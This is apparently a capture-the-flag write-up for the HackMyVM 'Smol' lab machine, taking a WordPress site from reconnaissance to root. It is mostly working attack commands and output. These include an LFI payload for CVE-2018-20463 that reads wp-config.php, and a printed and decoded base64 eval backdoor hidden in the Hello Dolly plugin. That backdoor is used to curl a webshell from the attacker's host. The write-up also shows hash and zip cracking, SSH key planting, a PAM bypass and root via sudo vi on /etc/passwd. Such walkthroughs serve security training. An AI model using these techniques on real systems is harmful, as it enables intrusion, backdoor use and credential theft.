# Smol

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.84:22
Open 10.0.2.84:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.84
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMc4hLykriw3nBOsKHJK1Y6eauB8OllfLLlztbB4tu4c9cO8qyOXSfZaCcb92uq/Y3u02PPHWq2yXOLPler1AFGVhuSfIpokEnT2jgQzKL63uJMZtoFzL3RW8DAzunrHhi/nQqo8sw7wDCiIN9s4PDrAXmP6YXQ5ekK30om9kd5jHG6xJ+/gIThU4ODr/pHAqr28bSpuHQdgphSjmeShDMg8wu8Kk/B0bL2oEvVxaNNWYWc1qHzdgjV5HPtq6z3MEsLYzSiwxcjDJ+EnL564tJqej6R69mjII1uHStkrmewzpiYTBRdgi9A3Yb+x8NxervECFhUR2MoR1zD+0UJbRA2v1LQaGg9oYnYXNq3Lc5c4aXz638wAUtLtw2SwTvPxDrlCmDVtUhQFDhyFOu9bSmPY0oGH5To8niazWcTsCZlx2tpQLhF/gS3jP/fVw+H6Eyz/yge3RYeyTv3ehV6vXHAGuQLvkqhT6QS21PLzvM7bCqmo1YIqHfT2DLi7jZxdk=
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJNL/iO8JI5DrcvPDFlmqtX/lzemir7W+WegC7hpoYpkPES6q+0/p4B2CgDD0Xr1AgUmLkUhe2+mIJ9odtlWW30=
|   256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFG/Wi4PUTjReEdk2K4aFMi8WzesipJ0bp0iI0FM8AfE
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://www.smol.hmv
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

Add DNS record.

## HTTP

![writeup.png](/assets/pentest/hackmyvm/smol/writeup.png)

```bash
└─$ nuclei -u http://www.smol.hmv/ -tags wordpress
[INF] Templates clustered: 12 (Reduced 6 Requests)
[CVE-2018-20462] [http] [medium] http://www.smol.hmv/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=saveFile&data=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&mimetype=text/html;%20charset=utf-8
[INF] Using Interactsh Server: oast.live
[wordpress-akismet:outdated_version] [http] [info] http://www.smol.hmv/wp-content/plugins/akismet/readme.txt ["5.2"] [last_version="5.5"]
[wordpress-xmlrpc-listmethods] [http] [info] http://www.smol.hmv/xmlrpc.php
[CVE-2018-20463] [http] [high] http://www.smol.hmv/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
[wordpress-xmlrpc-detect] [http] [info] http://www.smol.hmv/xmlrpc.php
[wordpress-directory-listing] [http] [info] http://www.smol.hmv/wp-content/uploads/
[wp-license-file] [http] [info] http://www.smol.hmv/license.txt
[wordpress-directory-listing] [http] [info] http://www.smol.hmv/wp-includes/
[wordpress-login] [http] [info] http://www.smol.hmv/wp-login.php
[wp-xmlrpc-pingback-detection] [http] [info] http://www.smol.hmv/xmlrpc.php
[wordpress-readme-file] [http] [info] http://www.smol.hmv/readme.html
[wp-user-enum:usernames] [http] [low] http://www.smol.hmv/?rest_route=/wp/v2/users/ ["admin","think","wp","Jose Mario Llado Marti","wordpress user"]
[wordpress-detect:version_by_css] [http] [info] http://www.smol.hmv/wp-admin/install.php ["6.8.3"]
[wordpress-theme-detect:popularfx] [http] [info] http://www.smol.hmv/
[INF] Scan completed in 55.883220834s. 14 matches found.
```

### LFI (CVE-2018-20463)

```bash
└─$ curl 'http://www.smol.hmv/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php' -s | grep define
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wpuser' );
define( 'DB_PASSWORD', 'kbLSF2Vop#lw3rjDZ629*Z%G' );
define( 'DB_HOST', 'localhost' );
define( 'DB_CHARSET', 'utf8' );
define( 'DB_COLLATE', '' );
define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );
define( 'WP_DEBUG', false );
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
```

### RCE (Backdoor)

::: tip Creds
`wpuser:kbLSF2Vop#lw3rjDZ629*Z%G`
:::

![writeup-1.png](/assets/pentest/hackmyvm/smol/writeup-1.png)

- [hello-dolly](https://github.com/WordPress/hello-dolly)

Searching the file with LFI revealed some hidden piece of code inside this plugin
```php
└─$ curl 'http://www.smol.hmv/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../hello.php'
...
// This just echoes the chosen line, we'll position it later.
function hello_dolly() {
        eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));

        $chosen = hello_dolly_get_lyric();
        $lang   = '';
        if ( 'en_' !== substr( get_user_locale(), 0, 3 ) ) {
                $lang = ' lang="en"';
        }

        printf(
                '<p id="dolly"><span class="screen-reader-text">%s </span><span dir="ltr"%s>%s</span></p>',
                __( 'Quote from Hello Dolly song, by Jerry Herman:' ),
                $lang,
                $chosen
        );
}
...
```

```bash
└─$ php -r "echo(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));"
 if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); } 

└─$ py -c 'print("\143\155\x64")'
cmd
```

It doesn't work
```bash
└─$ curl 'http://www.smol.hmv/wp-content/plugins/hello.php' --data-urlencode 'cmd=id' -i
HTTP/1.0 500 Internal Server Error
```

![writeup-2.png](/assets/pentest/hackmyvm/smol/writeup-2.png)

It's included in the `index.php`

![writeup-3.png](/assets/pentest/hackmyvm/smol/writeup-3.png)

[http://www.smol.hmv/wp-admin/index.php?cmd=curl+10.0.2.15%2Fshell.php+-O](http://www.smol.hmv/wp-admin/index.php?cmd=curl+10.0.2.15%2Fshell.php+-O)

![writeup-4.png](/assets/pentest/hackmyvm/smol/writeup-4.png)

```bash
www-data@smol:…/wordpress/wp-admin# mysql -u"wpuser" -p"kbLSF2Vop#lw3rjDZ629*Z%G" -D "wordpress" -e "SELECT CONCAT(user_login,':',user_pass) FROM wp_users;"
admin:$P$B5Te3OJvzvJ7NjDDeHZcOKqsQACvOJ0
wpuser:$wp$2y$10$qVVpgTmzlX3c9AIm3j2cW.L0J.HbiC.5sAtLUPPZ.ldTLDvSO6fxm
think:$P$B0jO/cdGOCZhlAJfPSqV2gVi2pb7Vd/
gege:$P$BsIY1w5krnhP3WvURMts0/M4FwiG0m1
diego:$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1
xavi:$P$BvcalhsCfVILp2SgttADny40mqJZCN/
```

```bash
➜ john.exe \Users\Public\hashes.txt --wordlist=\Users\Public\rockyou.txt
sandiegocalifornia (diego)
```

## SSH

```bash
www-data@smol:…/wordpress/wp-admin# echo sandiegocalifornia | timeout 1 su diego -c id
Password: uid=1002(diego) gid=1002(diego) groups=1002(diego),1005(internal)

www-data@smol:…/wordpress/wp-admin# echo sandiegocalifornia | timeout 1 su diego -c 'find ~ -type f -ls'
Password:    393670      4 -rw-r--r--   1 diego    diego         807 Feb 25  2020 /home/diego/.profile
   393672      4 -rw-r--r--   1 diego    diego        3771 Feb 25  2020 /home/diego/.bashrc
   393674      4 -rw-r--r--   1 diego    diego         220 Feb 25  2020 /home/diego/.bash_logout
   393373      4 -rw-r--r--   1 root     root           33 Aug 16  2023 /home/diego/user.txt
```

Generate keys
```bash
└─$ ssh-keygen -f id_rsa.diego -P x -q
└─$ echo "mkdir ~/.ssh; echo '$(cat id_rsa.diego.pub)' > ~/.ssh/authorized_keys"
mkdir ~/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJNcATXeFZZn/viNUqyZendS1bANQjqDNHuAmGgMeIJF woyag@kraken' > ~/.ssh/authorized_keys
```

Upload via webshell
```bash
www-data@smol:…/wordpress/wp-admin# mkdir ~/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMCz729clN2yA//aA1PBU/LxoaAigno4OqqClEfCykez woyag@kraken' > ~/.ssh/authorized_keys
```

```bash
└─$ ssh -i id_rsa diego@smol.hmv
diego@smol:~$ id
uid=1002(diego) gid=1002(diego) groups=1002(diego),1005(internal)
```

### User.txt

```
diego@smol:~$ cat user.txt
45edaec653ff9ee06236b7ce72b86963
```

## Privilege Escalation (think)

We can read other user files
```bash
diego@smol:~$ find .. -type f -ls 2>/dev/null
   393678      4 -rw-r--r--   1 gege     gege          807 Feb 25  2020 ../gege/.profile
   393391  31512 -rwxr-x---   1 root     gege     32266546 Aug 16  2023 ../gege/wordpress.old.zip
   393680      4 -rw-r--r--   1 gege     gege         3771 Feb 25  2020 ../gege/.bashrc
   393683      4 -rw-r--r--   1 gege     gege          220 Feb 25  2020 ../gege/.bash_logout
   393662      4 -rw-r--r--   1 xavi     xavi          807 Feb 25  2020 ../xavi/.profile
   393664      4 -rw-r--r--   1 xavi     xavi         3771 Feb 25  2020 ../xavi/.bashrc
   393666      4 -rw-r--r--   1 xavi     xavi          220 Feb 25  2020 ../xavi/.bash_logout
   407005      4 -rw-r--r--   1 think    think         807 Jun  2  2023 ../think/.profile
   407008      4 -rw-r--r--   1 think    think        3771 Jun  2  2023 ../think/.bashrc
   407009      4 -rw-r--r--   1 think    think         220 Jun  2  2023 ../think/.bash_logout
   393381      4 -rwxr-xr-x   1 think    think        2602 Jun 21  2023 ../think/.ssh/id_rsa
   393383      4 -rwxr-xr-x   1 think    think         572 Jun 21  2023 ../think/.ssh/authorized_keys
   393382      4 -rwxr-xr-x   1 think    think         572 Jun 21  2023 ../think/.ssh/id_rsa.pub
   393931      0 -rw-r--r--   1 diego    diego           0 Oct 15 16:54 ../diego/.cache/motd.legal-displayed
   393670      4 -rw-r--r--   1 diego    diego         807 Feb 25  2020 ../diego/.profile
   393672      4 -rw-r--r--   1 diego    diego        3771 Feb 25  2020 ../diego/.bashrc
   393674      4 -rw-r--r--   1 diego    diego         220 Feb 25  2020 ../diego/.bash_logout
   393929      4 -rw-rw-r--   1 diego    diego          94 Oct 15 16:53 ../diego/.ssh/authorized_keys
   393373      4 -rw-r--r--   1 root     root           33 Aug 16  2023 ../diego/user.txt
```

```bash
└─$ scp -i id_rsa.diego diego@smol.hmv:/home/think/.ssh/id_rsa id_rsa.think
└─$ chmod 600 id_rsa.think
└─$ ssh -i id_rsa.think think@smol.hmv
think@smol:~$ id
uid=1000(think) gid=1000(think) groups=1000(think),1004(dev),1005(internal)
```

## Privilege Escalation (gege)

```bash
└─$ scp -i id_rsa.think /opt/scripts/enum/peass/linpeas.sh think@smol.hmv:/tmp/lp.sh
think@smol:/home$ bash /tmp/lp.sh | tee /tmp/lp.log
...
╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Mar 29  2024 
-rw-r--r-- 1 root root 2133 Mar 29  2024 /etc/pam.d/sshd
account    required     pam_nologin.so
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so close
session    required     pam_loginuid.so
session    optional     pam_keyinit.so force revoke
session    optional     pam_motd.so  motd=/run/motd.dynamic
session    optional     pam_motd.so noupdate
session    optional     pam_mail.so standard noenv # [1]
session    required     pam_limits.so
session    required     pam_env.so # [1]
session    required     pam_env.so user_readenv=1 envfile=/etc/default/locale
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so open
...
```

Nothing too interesting from LinPeas, but **PAM Auth** section was different from LinPeas I had run so far.
```bash
think@smol:/home$ grep think /etc/pam.d -Rn
/etc/pam.d/su:8:auth  sufficient                 pam_succeed_if.so use_uid user = think

think@smol:/home$ cat /etc/pam.d/su | grep -vE '^$|#'
auth       sufficient pam_rootok.so
auth  [success=ignore default=1] pam_succeed_if.so user = gege
auth  sufficient                 pam_succeed_if.so use_uid user = think
session       required   pam_env.so readenv=1
session       required   pam_env.so readenv=1 envfile=/etc/default/locale
session    optional   pam_mail.so nopen
session    required   pam_limits.so
@include common-auth
@include common-account
@include common-session
```

The stack contains two `pam_succeed_if` tests that alter control flow: one tests `user = gege`, the other tests the _calling_ user (`use_uid`) equals `think`. The `think` test is marked `sufficient`, so if the caller is `think` the authentication is satisfied and the normal password prompt is skipped.

```bash
think@smol:/home$ su - gege
gege@smol:~$ id
uid=1003(gege) gid=1003(gege) groups=1003(gege),1004(dev),1005(internal)
```

## Privilege Escalation (xavi)

```bash
gege@smol:~$ unzip -l wordpress.old.zip | grep config
     2994  2023-08-16 20:30   wordpress.old/wp-config.php
    14627  2023-08-16 20:24   wordpress.old/wp-content/plugins/akismet/views/config.php
        0  2023-08-16 20:22   wordpress.old/wp-content/w3tc-config/
      808  2023-08-16 20:24   wordpress.old/wp-content/w3tc-config/master-admin.php
        0  2023-08-16 20:24   wordpress.old/wp-content/w3tc-config/index.html
    19347  2023-08-16 20:24   wordpress.old/wp-content/w3tc-config/master.php
      175  2023-08-16 20:24   wordpress.old/wp-content/themes/twentytwentyone/assets/sass/05-blocks/_config.scss
      283  2023-08-16 20:24   wordpress.old/wp-content/themes/twentytwentyone/postcss.config.js
    17742  2023-08-16 20:25   wordpress.old/wp-admin/setup-config.php

gege@smol:~$ unzip wordpress.old.zip -j wordpress.old/wp-config.php
Archive:  wordpress.old.zip
[wordpress.old.zip] wordpress.old/wp-config.php password: 
```

```bash
gege@smol:~$ cp wordpress.old.zip /tmp
gege@smol:~$ chmod 777 /tmp/wordpress.old.zip

└─$ scp -i id_rsa.diego diego@smol.hmv:/tmp/wordpress.old.zip .
└─$ zip2john wordpress.old.zip -o 'wordpress.old/wp-config.php' | tee wp.hash
Using file wordpress.old/wp-config.php as only file to check
ver 2.0 efh 5455 efh 7875 wordpress.old.zip/wordpress.old/wp-config.php PKZIP Encr: TS_chk, cmplen=1224, decmplen=2994, crc=25B946C5 ts=A3CE cs=a3ce type=8
wordpress.old.zip/wordpress.old/wp-config.php:$pkzip$1*1*2*0*4c8*bb2*25b946c5*48*55*8*4c8*a3ce*31ec07b08b8ac36e1be5877cf720c9ceadf9e4d55875922249ed975230cbcaaf78b5ae3d2f9468e4681e53005219818e37525a519fc42723af32de74060a000b6f3809ccdd5155459565848152e61a3585408122948adb0c5ef6b7cc7e92db7cce1fa7f82898da68a682ca0313a797f0a39a008ea98979f3e90d1de6bb9586ce905051a3dcdcad61bf3f21dfdb278d1f5c91bf71e733c69963186d216af3bd6fb65b5d94ddf5b89d619131c6c412eae2a2e84cc647711859894ec354f7664cc0dea2fddbc0d4c6c98bb0f46abd1f8500be96f8477cd785aaa5c1497651675848b456f7d2c3a88fa984dd308772bb26fcb4a35e2a9881a8cd5fb653f56bf0e002661a0d0cb5830b4d69065e76ec05710e0e897fdba9e41bfe3b20e108cb0e664a240d6a39dcd5d7b97be448b1155fa00aba7074f682d7d423ba90d592f902266d66e45073d4f49fed25b981478599d9e9493befd929e2caa679dba8b9d5497fe406b316fca93764ae35ea4377bb2d7d944b4624f35330f8e9030ef2fad04ac61577af8495ae22f843729a89678ac9d661a0130615f70c05a96dbfb0746814420e90b4a32476da00314118bfe9b4bf9c5e1e221938dffc530ced99aba54689512f63265448319c99bf746d7ac65be876d4084672b05b5eaf3d89f385b2fe04096f9d518de52a2fe9ed9407656ead7e40ae0e0ebf27fa18f66f9e3402e8c870ce468fa8c7760f1460c8f5856d81d507e421392450a5474159af759d5aeecae2f944199431f67a8f12bad29e843636ae76746bb6659af4d647285caaafd7f0b49a537e5e4cbfa87c1e7da18d575c9b6df1c0b7250db29380a174565362cecb202205d7ebe9033ccbe6ede6aa9ae98166d536e0ca6c8dd2cb403af0d3d159422d5f7d07198cede2ded5702549f4ab2de12caa4c84c954074f5d57d9a686ddae0aac712ee4ab8d53780b0a85f46f33f1f9ff3ddfa59e8c293f02fcbeddc44bf97c7a00bf53c999fa122459be61e8211bf240857378f788987421b2a0e7f2f674aefe82dbdf173704fb9a7b80a53391e8380586abc7863bf48fec37d8271499cbf20b1996ee5337dd9ad3d4ebe3b4b2eeac555692b0087e3bfbf9e80b235324f023e93db27a8b76a35f12a4b9c557982498d4220e4c5b0bba17556a62dbdb33f053f42418063fd0ca73f178aa8b3070aea27e78cfd77afbcc3e7ed9e1b259fff59a57a6ec780da2ff047c63696db821a0c083d29071d6819abb458cd819c43ea41b2335d6b9eb5e63ab838acbc04aa826f7c9829b23bde5d2e94be51d7af26353b25c932cc5c8d656ec8d86b630029e54a7ddcae86063f35b63c584d8368fcb295616e5d74794a11afd4eebb92bf549561a5bb8d87640075db41b1dd61a66d1029f68531aabbb6cc8829e246426757f88b63b0b54076a5160de57f263b8a09e5e406a2fb580a7e7d1df65dec73b6c7f02a25561d3835ea6f39b5529e952114337cb54abd4bc5795dbbda18906540cf65bb722252b0c6476764003ffa313be2b3aecca6e1afdf28306c15c6d65602cad8b2cb0ed352a76859bdba95acecc044d7151748858f619510aa21dd6869eedc86bece54dbf0c7fe4e329e4978e179d8a04d7a941248f8899f8afbaaf4e8679163466f9264782df4eae19ae1f5762701a25df66ef3e1e18bec81cff56a8c56b180ea689a4ef9a8b1540eb0eec08a4e9df1843b01f1979255e44090835*$/pkzip$:wordpress.old/wp-config.php:wordpress.old.zip::wordpress.old.zip
```

```bash
➜ john.exe \Users\Public\hashes.txt --wordlist=\Users\Public\rockyou.txt
hero_gege@hotmail.com (wordpress.old.zip/wordpress.old/wp-config.php)
```

```bash
└─$ unzip -j wordpress.old.zip wordpress.old/wp-config.php
Archive:  wordpress.old.zip
[wordpress.old.zip] wordpress.old/wp-config.php password:
  inflating: wp-config.php

└─$ grep define wp-config.php
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'xavi' );
define( 'DB_PASSWORD', 'P@ssw0rdxavi@' );
define( 'DB_HOST', 'localhost' );
define( 'DB_CHARSET', 'utf8' );
define( 'DB_COLLATE', '' );
define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );
define( 'WP_DEBUG', true );
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
```

::: tip Creds
`xavi:P@ssw0rdxavi@`
:::

```bash
gege@smol:~$ su xavi
Password: P@ssw0rdxavi@
xavi@smol:/home/gege$ id
uid=1001(xavi) gid=1001(xavi) groups=1001(xavi),1005(internal)
```

## Privilege Escalation (root)

```
xavi@smol:/home/gege$ sudo -l
Matching Defaults entries for xavi on smol:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User xavi may run the following commands on smol:
    (ALL : ALL) /usr/bin/vi /etc/passwd
```

### Method 1

[https://gtfobins.github.io/gtfobins/vi](https://gtfobins.github.io/gtfobins/vi)
```bash
xavi@smol:/home/gege$ sudo /usr/bin/vi /etc/passwd
1. Type `:!sh` to get shell

# id
uid=0(root) gid=0(root) groups=0(root)
```

### Method 2

Add new user
```bash
xavi@smol:/home/gege$ echo "letmein:$(openssl passwd -6 'Password123$'):0:0:letmein:/root:/bin/bash"
letmein:$6$j9cTuTQSEiVhIDsB$B5lKvmIee4BL4ozCVSNpShFCqTINMSc74TzFn1edI9H.bpCi0dA4jRFm4ctFIjpGYZVzhARpTM6u.zIjKnJs1/:0:0:letmein:/root:/bin/bash

xavi@smol:/home/gege$ sudo /usr/bin/vi /etc/passwd
1. Go down with arrows
2. Press letter O
3. Ctrl+Shift+V
4. :wq
   
xavi@smol:/home/gege$ su - letmein
Password:
root@smol:~$ id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```bash
root@smol:~$ cat /root/root.txt
bf89ea3ea01992353aef1f576214d4e4
```